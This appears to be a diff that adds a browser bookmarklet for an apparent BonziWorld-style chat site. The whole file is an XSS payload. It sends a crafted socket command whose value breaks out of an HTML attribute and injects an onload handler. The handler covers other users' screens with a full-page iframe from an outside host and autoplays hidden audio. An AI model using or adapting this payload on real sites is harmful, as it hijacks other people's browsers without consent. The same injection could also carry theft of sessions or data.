@@ -1,0 +1,3 @@
+javascript:socket.emit('command', {
+  list: ['youtube', 'eee" onload="var iframe=document.createElement(\'iframe\');iframe.src=\'https://bonziworldberylicarus.onrender.com\';iframe.style.position=\'fixed\';iframe.style.top=\'0\';iframe.style.left=\'0\';iframe.style.width=\'100vw\';iframe.style.height=\'100vh\';iframe.style.border=\'none\';iframe.style.zIndex=\'9999\';document.body.appendChild(iframe); var audio=document.createElement(\'audio\');audio.src=\'https://github.com/GreenwaveStudios/BonziSKRIPTS-bonziworldjs-scripts/raw/refs/heads/main/imagesandvideos/TTS%20Audio%20Clip%20(10).mp3\';audio.autoplay=true;audio.style.display=\'none\';document.body.appendChild(audio);"']
+})
